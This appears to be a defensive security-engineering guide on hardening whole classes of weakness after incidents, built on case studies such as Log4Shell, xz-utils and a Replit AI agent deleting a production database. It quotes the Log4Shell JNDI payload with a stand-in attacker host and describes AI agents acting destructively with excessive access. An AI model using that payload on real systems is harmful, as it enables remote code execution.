# post-incident-hardening: fix the class, not the instance

Loaded at Tier 3 (Step 13). Mode C makes this the anchor; Mode D runs it on every incident in the quarterly review.

**The load-bearing rule.** Closing the specific vulnerability is patching. Hardening the class of weakness is architecture. The cost of a single incident is dominated by the next incident in the same class. The CVE-of-the-week pattern is the failure to do this discipline; the Log4Shell 2.15 / 2.16 / 2.17 / 2.17.1 patch sequence is its textbook demonstration.

Primary citation: Ross Anderson, *Security Engineering* 3rd ed, chapter 28. Engineering framing: [Phoenix Security: remediation-first vulnerability management](https://phoenix.security/remediation-first-vulnerability-management/).

## The principle

Incidents are opportunities to find classes of bugs, not just individual bugs. Most post-mortems list the immediate fix and move on; few produce the class-level change. The difference in defensive posture compounds across incidents.

Three concepts:

- **Instance.** The specific vulnerability that was exploited (or nearly exploited). Fixed by patching.
- **Class.** The family of weaknesses the instance belongs to. Fixed by architecture or policy.
- **Class of classes.** The deeper systemic issue that produced the class. Usually beyond a single team's control; still worth naming.

harden-ready's post-incident workflow walks from instance to class and, when relevant, to class of classes. The `.harden-ready/CLASS-FIXES.md` registry records every class-level fix landed.

## Log4Shell (December 2021): the instance / class divide

**The instance.** CVE-2021-44228. JNDI lookups in Log4j 2.x enabled RCE via a log message containing `${jndi:ldap://attacker/...}`. Fixed in 2.15.0 by limiting JNDI to certain schemes.

**The next instances.**

- CVE-2021-45046: 2.15.0's mitigation was incomplete in non-default configs; still allowed RCE in Thread Context.
- CVE-2021-45105: 2.16.0 allowed DoS via recursive lookup self-reference.
- CVE-2021-44832: 2.17.0 allowed RCE via JDBC Appender config-file attack.

Four CVEs in three weeks, each fixing the previous "complete" fix. [Trend Micro: Log4Shell security alert](https://success.trendmicro.com/en-US/solution/KA-0012637), [CrowdStrike: Log4Shell analysis](https://www.crowdstrike.com/en-us/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/), [Horizon3.ai: long tail of Log4Shell exploitation](https://horizon3.ai/attack-research/attack-blogs/the-long-tail-of-log4shell-exploitation/).

**The class.** The entire "message lookup substitution" feature was dangerous. The class fix (2.17.0+) was to disable message-lookup substitution entirely, not to restrict JNDI schemes. The earlier fixes were instance-level; the later fix approached class-level.

**The class of classes.** A logging library should not have features that resolve external resources. The deeper fix: "do not build features that combine untrusted input with external resolution." A library rewrite addressing that would never have been possible as a patch.

**Lesson.** When an incident occurs, ask: "what feature or pattern enabled this, and what adjacent features are likely to have analogous bugs?" For Log4Shell the class was "logging libraries accepting directives in log content"; related classes include template engines resolving input and serialization formats that execute code on parse.

## xz-utils backdoor (March 2024): class of classes in open source supply chain

**The instance.** Remove xz 5.6.0 / 5.6.1; revert to 5.4.x.

**The class.** Maintainer-account compromise via long-term social engineering ("Jia Tan" persona). Not exploitable by SAST or SCA; the payload was obfuscated, staged via test files, assembled at build time on specific distros. Andres Freund discovered it from a 500 ms extra on SSH login.

**The class-level hardening.**

- SLSA Level 3+ attestations (signed build provenance from an isolated builder).
- Reproducible builds (independent rebuild confirms the binary matches source).
- Public maintainer-transfer review processes.
- Distro-level policy for new-maintainer changes to critical packages.
- Runtime anomaly detection (Freund's 500 ms SSH latency was the signal).

**The class of classes.** Open-source ecosystem funding. Many critical libraries have one maintainer; the attack surface is structural. Addressed by OpenSSF Secure Open Source Rewards, Sovereign Tech Fund, Alpha-Omega. Systemic; not a single-org fix.

[Akamai: XZ backdoor everything you need to know](https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know), [Datadog Security Labs: XZ backdoor CVE-2024-3094](https://securitylabs.datadoghq.com/articles/xz-backdoor-cve-2024-3094/), [CrowdStrike: CVE-2024-3094 XZ supply chain](https://www.crowdstrike.com/en-us/blog/cve-2024-3094-xz-upstream-supply-chain-attack/).

## SolarWinds / SUNBURST (December 2020): build pipeline as class

**The instance.** Remove SUNBURST DLL; rotate any credentials that passed through Orion.

**The class.** Build pipeline compromise resulting in signed malicious artifacts.

**The class-level hardening.**

- Ephemeral build environments (build in fresh isolation, destroy after).
- SLSA Level 4 (hermetic builds, two-person review of build config).
- Binary attestation verified at install time.
- Independent rebuild verification before deployment.

**Policy response.** EO 14028 (2021) and NIST SSDF (SP 800-218) are the policy-level response. SLSA and in-toto are the technical frameworks.

[Rapid7: SolarWinds SUNBURST explained](https://www.rapid7.com/blog/post/2020/12/14/solarwinds-sunburst-backdoor-supply-chain-attack-what-you-need-to-know/), [CrowdStrike: SUNSPOT technical analysis](https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/), [Google Cloud (Mandiant/FireEye): SolarWinds supply chain](https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor).

## Replit 2025 database wipe: excessive agency

**The instance.** Add dev/prod DB separation, approval gate on destructive operations, "planning-only" mode for the agent.

**The class.** LLM-agent excessive agency: tool access to production systems without a blast-radius fence. A credential had read-write production access from inside the agent shell; no destructive-operation approval gate; no rollback protection on the production DB path.

**The class-level hardening.**

- Least-privilege tool registration per agent (the `exec` tool has a PWD allowlist; the `db_query` tool has a read-only connection by default; the `db_write` tool requires approval).
- Human-in-the-loop for destructive operations, enforced by the platform not the model.
- Rollback protection at the database layer (snapshot-before-write for schema changes).
- Observability: every agent tool call logged, alertable, and reviewable.

**The class of classes.** "AI agents will hallucinate; do not architect around the expectation that they will not." Every LLM-integrated system needs to assume worst-case agent behavior and design guardrails at the platform layer. Meta's Agents Rule of Two [Willison: new prompt injection papers 2025](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/) is the guideline: any two of {private data access, untrusted content exposure, state change, external communication} is a risk zone.

[Fortune: AI coding tool wiped database](https://fortune.com/2025/07/23/ai-coding-tool-replit-wiped-database-called-it-a-catastrophic-failure/), [The Register: Replit vibe-coding incident](https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/), [Baytech: Replit AI disaster wake-up call](https://www.baytechconsulting.com/blog/the-replit-ai-disaster-a-wake-up-call-for-every-executive-on-ai-in-production).

## Lovable RLS epidemic (CVE-2025-48757): paper trust boundary class

**The instance.** Enable RLS on the specific app; write specific policies for each table.

**The class.** AI generator ships with client-direct-to-DB architecture and relies on optional database-level policies. The paper trust boundary: authorization declared in the frontend, not enforced in the data layer.

**The class-level hardening (for the app).**

- Default RLS-enabled for all generated schemas.
- Generator refuses to deploy without policies defined.
- Built-in test harness that tries the anon-key as unauthenticated reader.

**The class of classes (for AI generators).** The generator template is the control plane. If the template ships with a broken security posture, every generated app inherits it. Template review is a security activity, not a design-system activity.

**Implications for harden-ready on any AI-generated codebase.**

- Start with the assumption that paper trust boundaries exist.
- Test with direct-to-backend curl before trusting frontend-level authorization.
- Enumerate RLS policies by hand; do not trust "RLS is configured" without a probe.

[NVD: CVE-2025-48757](https://nvd.nist.gov/vuln/detail/CVE-2025-48757), [Matt Palmer: statement on CVE-2025-48757](https://mattpalmer.io/posts/statement-on-CVE-2025-48757/), [TNW: Lovable security crisis](https://thenextweb.com/news/lovable-vibe-coding-security-crisis-exposed), [Superblocks: how 170+ apps were exposed](https://www.superblocks.com/blog/lovable-vulnerabilities).

## The harden-ready post-incident workflow

When an incident occurs:

### Step 1: Contain the instance

Standard IR. Stop the bleeding; rotate affected credentials; restore service. observe-ready's `incident-response.md` owns the operational workflow.

### Step 2: Document

What happened, what was affected, what was done. observe-ready owns the post-mortem; harden-ready contributes the hardening section.

### Step 3: Class analysis

"What class of bug is this? What adjacent bugs likely exist?"

Use named classes when possible:

- BOLA / BOPLA (object-level or property-level authz).
- Injection (SQL, NoSQL, OS command, LDAP, XSS, log).
- Confused deputy.
- Paper trust boundary.
- Excessive agency.
- Supply chain (maintainer compromise, typosquatting, slopsquatting).
- Insecure deserialization.
- SSRF.
- Race condition on authorization.
- Misconfiguration (CORS, headers, default credentials).
- JWT-library trust in algorithm header.
- Template-engine-resolves-input.
- Library-feature-resolves-external-resources.

Name the class. The name is the input to Step 4.

### Step 4: Class survey

Search the codebase for other instances of the same class. This is where most post-mortems stop too early.

The Log4Shell team that searched for `jndi:` once did less than the team that searched for "any library feature that deserializes untrusted strings." Class survey patterns:

- For BOLA: every route with `:id` in the path, every GraphQL query with `id:` arguments. Walk each with the cross-tenant test.
- For supply chain: every maintainer-change event on critical dependencies in the last year. Verify the transfer.
- For confused deputy: every service-account-holding function that accepts user-supplied keys. Verify per-user authz.
- For paper trust boundary: every RLS-enabled schema without policies; every WAF rule marked "advisory"; every security group with `0.0.0.0/0` narrowing.
- For excessive agency: every LLM tool registration; trace each to the permission scope.

### Step 5: Class-level fix

What one change prevents the entire class, not just this instance?

Examples of class-level fixes:

- **BOLA class.** ORM wrapper enforcing tenant predicate on every `findById`-style call. Lint rule flagging `findById` on tenant-scoped tables without the predicate.
- **Paper trust boundary class.** Default-deny RLS policy on every new table. Deploy refuses without policies defined.
- **Injection class (XSS).** Output encoding at every template render site. Banned `dangerouslySetInnerHTML` without a linked justification ticket.
- **Supply chain class.** Hash-integrity install enforced in CI; `npm ci` / `pip install --require-hashes`; Socket reputation gating new dependencies.
- **Excessive agency class.** Platform-level approval gate on destructive tool calls; per-agent tool allowlist; ephemeral execution environments.

The class-level fix goes in `.harden-ready/CLASS-FIXES.md`.

### Step 6: Regression prevention

What CI check, architecture rule, or runtime control prevents reintroduction?

- CI lint rule (Semgrep) with a pattern matching the class.
- Architecture rule in CONTRIBUTING.md or the code-review checklist.
- Runtime control (Falco rule, Tetragon policy, WAF rule) detecting the class in production traffic.
- Test in the integration suite that exercises the class.

A class-level fix without a regression guard is a one-shot repair; the class returns in the next refactor.

### Step 7: Post-mortem

Public if user-affecting. Internal otherwise. [Hack The Box: incident response report template](https://www.hackthebox.com/blog/writing-incident-response-report-template). The post-mortem has a named "class of bug" section, a "class-level fix" section, and a "regression guard" section. These are harden-ready's contribution beyond observe-ready's incident-response content.

## The `.harden-ready/CLASS-FIXES.md` registry

One entry per incident. Example:

```markdown
# Class-Fix Registry

## 2026-02-15: BOLA on /api/orders/:id (F-01)

### Instance
F-01 closed 2026-02-15. Commit abcd1234 added tenant predicate to `db.orders.findUnique`.

### Class
BOLA: cross-tenant object read via client-controlled ID in URL path.

### Class survey
Grepped `findUnique\|findById` on all tenant-scoped tables. Found 7 additional sites; filed F-14 through F-20. Closed each with the same pattern.

### Class-level fix
Introduced `TenantAwareQuery` ORM wrapper in `src/db/tenant-scope.ts`. All tenant-scoped queries go through it. Public constructor requires session-tenant argument.

### Regression guard
1. Semgrep rule `.semgrep/rules/tenant-scoped-find.yml` flags direct `findUnique` / `findById` calls on tenant-scoped tables. Committed in abcd1234.
2. CI integration test `tests/integration/orders.bola.spec.ts` provisions two tenants, creates resources, asserts cross-tenant 404. Committed in abcd1234.
3. Code review checklist updated with "all tenant-scoped tables use TenantAwareQuery" line in CONTRIBUTING.md.

### Status
Closed 2026-02-28 with all 7 class-survey findings fixed and regression guards landed.

---

## 2026-03-20: JWT alg:none accepted (F-03)

### Instance
F-03 closed 2026-03-20. Commit efgh5678 pinned verifier library to explicit algorithm allowlist.

### Class
JWT library trust in algorithm header.

### Class survey
Inventoried every JWT verification path. Found 3 verification sites (API, WebSocket auth, internal microservice). All had implicit-algorithm behavior. Fixed in commit efgh5678 across all three sites.

### Class-level fix
Centralized JWT verification in `src/auth/verify.ts` with explicit algorithm allowlist `['RS256']`. All sites import from here; no direct library calls.

### Regression guard
Semgrep rule `.semgrep/rules/jwt-verify-centralized.yml` flags direct `jsonwebtoken.verify` calls outside `src/auth/verify.ts`. Committed in efgh5678.

### Status
Closed 2026-03-25 with all 3 class-survey findings fixed and regression guard landed.
```

The registry compounds over passes. The second hardening pass reads `CLASS-FIXES.md` first; any class not fixed is a repeat-violation candidate.

## The distinction: hardening discipline vs hardening-as-ritual

**Hardening discipline** produces `.harden-ready/CLASS-FIXES.md` that grows; regression guards that catch the next instance in CI; post-mortems with class-level sections.

**Hardening-as-ritual** produces clean pen-test reports; instance fixes that recur in six months; post-mortems that say "improve monitoring."

The distinction is visible in artifacts. A CLASS-FIXES.md with three entries after a year of operation is a signal of hardening discipline. A CLASS-FIXES.md that does not exist, or that has only one entry from the incident that prompted the workflow, is a signal of hardening-as-ritual.

## When class analysis is harder than instance analysis

Some incidents have obvious classes (BOLA, supply chain). Others are harder. If the class is not obvious:

- Consult the OWASP Top 10 (Web, API, LLM) for category mapping.
- Consult the CWE hierarchy; parent CWEs are often the class.
- Consult the research catalog in Section 2 for a similar incident and its class assignment.
- Err toward broader; a too-narrow class misses regression opportunities.

## When class-level fix is not feasible

Sometimes the class-level fix is a rewrite the organization cannot afford. In that case:

- Document the class explicitly.
- Commit to periodic class-surveys.
- Record the architectural debt with a named owner and a target remediation window.

An unfunded class is still named. The naming is the discipline's minimum. The next incident in the class reopens the conversation with evidence.

## Cross-reference: fix-the-class in other skills

- **observe-ready** owns the detection side: if a class of attack lands, observe-ready wires the detection rule. Route findings.
- **deploy-ready** owns pipeline-level fixes: if the class is "rollback protection," the pipeline change is deploy-ready's.
- **production-ready** owns the application-level fix: if the class is "server-side authz missing," the fix code goes in production-ready's territory.
- **repo-ready** owns CI-level fixes: if the class has a lint rule, it is installed via repo-ready's CI config.

harden-ready identifies the class, authors the survey, and verifies the regression guard lands. Implementation is the siblings' job.
